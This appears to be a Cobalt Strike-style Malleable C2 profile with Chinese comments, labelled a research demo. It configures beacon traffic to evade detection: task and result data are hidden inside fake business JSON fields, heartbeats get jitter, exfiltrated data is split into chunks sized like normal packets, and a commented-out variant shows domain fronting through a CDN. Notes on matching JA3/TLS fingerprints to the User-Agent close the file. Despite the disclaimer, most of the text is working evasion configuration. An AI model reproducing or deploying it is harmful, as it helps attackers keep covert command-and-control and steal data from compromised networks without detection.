# C2 流量与行为定制 profile demo（研究配置，非可执行物）
# 用途：Beacon 类 C2 的 malleable 配置参考——流量特征消减四件套
# 声明：本文件仅用于本地实验环境学习对照；语法为 Cobalt Strike Malleable 风格，
#       少量研究语义伪指令（chunk_*）仅承载对抗思路，不可被 C2 直接加载。

# ==================== 全局行为参数 ====================
set sample_name "telemetry-app";      # 样本名——威胁情报侧：同一 profile 跨样本复用=已知指纹
set host_stage "false";               # 关闭明文 staging：外带面只剩业务包裹形态
set sleep "60000";                    # ③ 心跳基准：60s
set jitter "20";                      # ③ 抖动 ±20% → 实际心跳窗口 48~72s（对冲低抖动心跳聚类检测）

# ==================== http-get：任务拉取（四件套之①：业务 JSON 包裹） ====================
http-get {
    set uri "/api/v1/telemetry";      # 业务路径（常见业务命名，避 C2 默认 URI 字典）
    set verb "POST";                  # 动词面打磨：GET 语义检查也走 POST（业务接口本就 POST）

    client {
        # 数据外带伪装：追加到正常业务字段（jq 风格 JSON 体）
        body {
            id = "0123456789abcdef";        # 稳定业务设备号
            metric = base64url(output);     # beacon 数据 → base64url → 业务字段
            ts = "1699999999";              # 业务时间戳
        }
        header {
            Accept = "application/json";
            Content-Type = "application/json";
            # ② JA3 指纹面：默认 TLS 栈 + 常见 UA（与真实业务客户端一致，
            #    TLS 栈/套件顺序/ALPN 必须与 UA 同生态——原则见文末注释块）
            User-Agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) MyApp/2.1";
        }
    }

    server {
        header {
            Content-Type = "application/json";
            Cache-Control = "no-store";
        }
        # ① 回传包裹在业务 JSON 里：任务命令藏在 items[].v（与真实业务分页结构同形）
        output {
            base64url;
            prepend "{\"items\":[{\"v\":\"";
            append "\"}]}";
            print;                          # 输出终止语句（C2 语法要求，补全点）
        }
    }
}

# ==================== http-post：结果上送（③ 心跳节 + ④ 分段外带） ====================
http-post {
    set uri "/api/v1/events";         # 结果上送业务接口（与拉取接口分离）
    set verb "POST";

    client {
        # ③ 心跳节：空闲期零上行——结果与心跳语义合并（周期性统计检测只见业务拉取节奏，
        #    上行呈现"事件上报"业务形态）；上行体仍为业务 JSON 包裹
        body {
            sid = "0123456789abcdef";       # 会话标识业务字段
            evt = base64url(output);        # 结果数据塞业务字段
            ttl = "299";                    # 业务 TTL 字段（随心跳语义自增）
        }
        header {
            Accept = "application/json";
            Content-Type = "application/json";
        }
    }

    server {
        header {
            Content-Type = "application/json";
            Cache-Control = "no-store";
        }
        # 上行确认回执也走业务 JSON（ack 字段）——收发两侧包型与真实业务一致
        output {
            base64url;
            prepend "{\"ack\":\"";
            append "\"}";
            print;
        }
    }
}

# ==================== ④ 分段外带（chunk 语义，研究伪指令） ====================
# 大结果按块切片、多轮 http-post 上送：单包体积与业务事件包对齐（响应长度
# 基线偏离检测对冲）；分片序号/总数伪装成业务分页字段。
set chunk_mode "split";               # 分段发送：结果 > 阈值时按块切片
set chunk_size "4096";                # 单块上限 4KB（对齐业务事件包体积）
set chunk_param "seq,seq_total";      # 分片序号/总数 → 业务分页字段（jq 风格）

# ==================== 进阶变体（注释块）：域前置 ====================
# 域前置（Domain Fronting）：连接域与 Host 头分离——TLS 实际连到 CDN 边缘节点，
# Host 头指向被前置的真实业务域；流量设备（尤其出口审计）只见 CDN 域。
# 变体写法示意（未启用）：
#
# http-get {
#     set uri "/api/v1/telemetry";      # 实际连接域由监听器指向 CDN 边缘（如 edge-cdn.example.net）
#     client {
#         header {
#             # Host 头与被前置业务域一致（real-app.example.com）——外层 TLS 却指向 CDN
#             Host = "real-app.example.com";
#             User-Agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) MyApp/2.1";
#         }
#     }
# }
# 注意：前置域名必须与目标业务共享同一 CDN 基础设施（证书同颁），否则握手即穿帮；
#       主流 CDN 已陆续封禁域前置（SNI 与 Host 一致性校验），使用前需实测通道可用性。

# ==================== ② JA3 一致化（原则注释块） ====================
# JA3 = ClientHello 的 TLS 版本+密码套件+椭圆曲线+扩展组合指纹；
# 检测侧用 JA3+HTTP2 指纹组合库比对客户端生态——指纹不一致=即穿帮。
# 原则：
#   1) TLS 栈与 UA 同生态：UA 声称 "Win10 + MyApp/2.1"，ClientHello 就必须是
#      Windows SChannel 风格（不能是 OpenSSL/Go 默认栈特征）；
#   2) 密码套件列表与目标业务客户端抓包样本对齐（固定顺序，随机顺序暴露自定义实现）；
#   3) 扩展顺序与 ALPN 一致：业务走 h2 则 profile 的 HTTP 语义需同步 h2 伪装，
#      否则 HTTP/1.1 行为落在 h2 业务基线之外。
